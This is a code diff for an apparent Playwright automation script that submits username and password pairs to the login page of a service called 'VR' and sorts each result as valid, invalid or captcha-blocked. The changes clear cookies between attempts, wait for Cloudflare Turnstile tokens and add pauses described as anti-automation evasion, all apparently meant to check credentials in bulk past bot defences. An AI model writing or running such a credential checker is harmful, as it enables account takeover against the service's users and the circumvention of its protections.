@@ -101,6 +101,11 @@ async def preparar_pagina():
         if state.page and not state.page.is_closed():
             try:
                 logger.info("[WARM WORKER] Reciclando aba em memória...")
+                if state.context:
+                    try:
+                        await state.context.clear_cookies()
+                    except Exception:
+                        pass
                 await state.page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=25000)
                 await state.page.wait_for_selector(SELECTOR_USERNAME, timeout=20000)
                 await state.page.wait_for_selector(SELECTOR_PASSWORD, timeout=20000)
@@ -249,6 +254,25 @@ async def testar_credenciais(req: TesteRequest):
             await pass_input.fill("")
             await pass_input.type(senha, delay=30)
 
+            # Verifica se Turnstile está ativo ou gerando token antes de clicar
+            try:
+                cf_input = page.locator('input[name="cf-turnstile-response"]').first
+                if await cf_input.count() > 0:
+                    val = await cf_input.get_attribute("value")
+                    if not val:
+                        logger.info("[WARM WORKER] Aguardando token Turnstile ser gerado em segundo plano...")
+                        for _ in range(12): # até 1.8s
+                            await asyncio.sleep(0.15)
+                            val = await cf_input.get_attribute("value")
+                            if val:
+                                logger.info("[WARM WORKER] Token Turnstile obtido com sucesso!")
+                                break
+                else:
+                    # Pausa natural anti-automação (400ms) para scripts de segurança completarem setup
+                    await asyncio.sleep(0.4)
+            except Exception:
+                await asyncio.sleep(0.4)
+
             btn = page.locator(SELECTOR_CONTINUAR).first
             if await btn.count() > 0:
                 await btn.click()
@@ -272,7 +296,7 @@ async def testar_credenciais(req: TesteRequest):
                     msg_resultado = "Login válido - etapa de código encontrada"
                     break
 
-                # Se detectou erro no DOM -> Inválido
+                # Se detectou erro no DOM -> Diferencia erro real de senha vs erro de desafio/Turnstile
                 try:
                     erro_locator = page.locator("#error-element-password, [data-error-code], .ulp-alert-danger, .ulp-input-error-message, .alert-danger, span[id*='error']")
                     count = await erro_locator.count()
@@ -281,10 +305,25 @@ async def testar_credenciais(req: TesteRequest):
                             el = erro_locator.nth(i)
                             if await el.is_visible():
                                 txt = (await el.inner_text()).strip()
-                                if txt:
+                                err_code = (await el.get_attribute("data-error-code") or "").strip()
+                                full_err = f"{txt} {err_code}".lower()
+
+                                # Erro 600010: falha de carregamento do desafio Turnstile
+                                if "600010" in full_err or "desafio de segurança" in full_err or "turnstile" in full_err or "captcha" in full_err:
+                                    resultado_valido = False
+                                    status_credencial = "bloqueio_captcha"
+                                    msg_resultado = f"Desafio de segurança da VR pendente (Código: {txt or err_code})"
+                                    turnstile_detectado = True
+                                    break
+                                elif any(k in full_err for k in ["incorret", "inválid", "invalido", "senha", "não encontramos", "verifique seus dados", "credenciais", "password"]):
                                     resultado_valido = False
                                     status_credencial = "invalido"
                                     msg_resultado = f"Credenciais incorretas na VR: {txt}"
+                                    break
+                                elif txt:
+                                    resultado_valido = False
+                                    status_credencial = "invalido"
+                                    msg_resultado = f"Erro reportado pela VR: {txt}"
                                     break
                     if resultado_valido is False:
                         break
